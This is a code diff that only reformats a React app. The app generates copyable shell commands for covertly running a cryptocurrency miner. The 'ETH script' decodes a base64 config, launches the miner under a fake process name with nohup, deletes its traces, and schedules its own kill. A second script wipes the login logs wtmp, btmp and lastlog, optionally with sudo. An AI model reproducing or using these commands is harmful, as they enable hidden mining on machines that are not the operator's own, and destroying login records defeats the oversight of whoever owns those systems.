@@ -1,6 +1,6 @@
-import React, {useState} from 'react';
-import './App.css';
-import '98.css';
+import React, { useState } from 'react'
+import './App.css'
+import '98.css'
 
 const App = () => {
     const [minerFilepath, setMinerFilepath] = useState('/tmp/miner')
@@ -26,10 +26,10 @@ const App = () => {
 
     const clipboard = navigator.clipboard
 
-    const ethScript = ` echo ${btoa(config)} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 10 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill | at ${killAt}`
+    const ethScript = ` echo ${ btoa(config) } | base64 -d > ${ configFilename } && cp ${ minerFilepath } ${ fakeProcessName } && sh -c 'nohup ./${ fakeProcessName } --config ${ configFilename } &' && sleep 10 && rm -rf nohup.out ${ fakeProcessName } ${ configFilename } && ps aux | grep '${ fakeProcessName } --config ${ configFilename }' | grep -v grep | awk '{print $2}' | xargs echo kill | at ${ killAt }`
 
     const clearLoginHistoryScript = ` echo > /var/log/wtmp && echo > /var/log/btmp && echo > /var/log/lastlog`
-    const clearLoginHistoryScriptWithSudo = ` sudo sh -c '${clearLoginHistoryScript}'`
+    const clearLoginHistoryScriptWithSudo = ` sudo sh -c '${ clearLoginHistoryScript }'`
 
     const handleCopyETHScriptBtnClick = () => {
         clipboard.writeText(ethScript).then(() => {
@@ -86,7 +86,7 @@ const App = () => {
             }, 3000)
             return
         }
-        const data = JSON.parse(dataStr);
+        const data = JSON.parse(dataStr)
         setMinerFilepath(data.minerFilepath)
         setFakeProcessName(data.fakeProcessName)
         setConfig(data.config)
@@ -110,7 +110,7 @@ const App = () => {
     return (
         <div
             className="window"
-            style={{width: '700px'}}
+            style={ { width: '700px' } }
         >
             <div className="title-bar">
                 <div className="title-bar-text">
@@ -122,58 +122,58 @@ const App = () => {
                     <label>Miner filepath</label>
                     <input
                         type="text"
-                        value={minerFilepath}
-                        onChange={e => setMinerFilepath(e.target.value)}
+                        value={ minerFilepath }
+                        onChange={ e => setMinerFilepath(e.target.value) }
                     />
                 </div>
                 <div className="field-row-stacked">
                     <label>Fake process name</label>
                     <input
                         type="text"
-                        value={fakeProcessName}
-                        onChange={e => setFakeProcessName(e.target.value)}
+                        value={ fakeProcessName }
+                        onChange={ e => setFakeProcessName(e.target.value) }
                     />
                 </div>
                 <div className="field-row-stacked">
                     <label>Config</label>
                     <textarea
-                        rows={10}
-                        value={config}
-                        onChange={e => setConfig(e.target.value)}
+                        rows={ 10 }
+                        value={ config }
+                        onChange={ e => setConfig(e.target.value) }
                     />
                 </div>
                 <div className="field-row-stacked">
                     <label>Config filename</label>
                     <input
                         type="text"
-                        value={configFilename}
-                        onChange={e => setConfigFilename(e.target.value)}
+                        value={ configFilename }
+                        onChange={ e => setConfigFilename(e.target.value) }
                     />
                 </div>
                 <div className="field-row-stacked">
                     <label>Kill at</label>
                     <input
                         type="text"
-                        value={killAt}
-                        onChange={e => setKillAt(e.target.value)}
+                        value={ killAt }
+                        onChange={ e => setKillAt(e.target.value) }
                     />
                 </div>
                 <div className="field-row-stacked">
                     <label>Rest & Save & Load</label>
                 </div>
                 <div className="field-row">
-                    <button onClick={handleResetBtnClick}>Reset</button>
-                    <button onClick={handleSaveDataToLocalStorageBtnClick}>Save data to local storage</button>
-                    <button onClick={handleLoadDataFromLocalStorageBtnClick}>Load data from local storage</button>
+                    <button onClick={ handleResetBtnClick }>Reset</button>
+                    <button onClick={ handleSaveDataToLocalStorageBtnClick }>Save data to local storage</button>
+                    <button onClick={ handleLoadDataFromLocalStorageBtnClick }>Load data from local storage</button>
                 </div>
                 <div className="field-row-stacked">
                     <label>ETH script</label>
                     <textarea
-                        rows={8}
+                        rows={ 8 }
                         disabled
-                        value={ethScript}
+                        value={ ethScript }
                     />
-                    <button onClick={handleCopyETHScriptBtnClick}>Copy ETH script</button>
+                    <button onClick={ handleCopyETHScriptBtnClick }>Copy ETH script</button>
                 </div>
                 <div className="field-row">
                     <label>Clear login history script</label>
@@ -181,24 +181,25 @@ const App = () => {
                     <input
                         type="checkbox"
                         id="sudo"
-                        checked={sudoFlag}
-                        onChange={handleSudoCheckboxChange}
+                        checked={ sudoFlag }
+                        onChange={ handleSudoCheckboxChange }
                     />
                     <label htmlFor="sudo">sudo</label>
                 </div>
                 <div className="field-row-stacked">
                     <textarea
                         disabled
-                        value={sudoFlag ? clearLoginHistoryScriptWithSudo : clearLoginHistoryScript}
+                        value={ sudoFlag ? clearLoginHistoryScriptWithSudo : clearLoginHistoryScript }
                     />
-                    <button onClick={handleCopyClearLoginHistoryScriptBtnClick}>Copy clear login history script</button>
+                    <button onClick={ handleCopyClearLoginHistoryScriptBtnClick }>Copy clear login history script
+                    </button>
                 </div>
                 <div>
-                    <p>{message}</p>
+                    <p>{ message }</p>
                 </div>
             </div>
         </div>
-    );
+    )
 }
 
-export default App;
+export default App
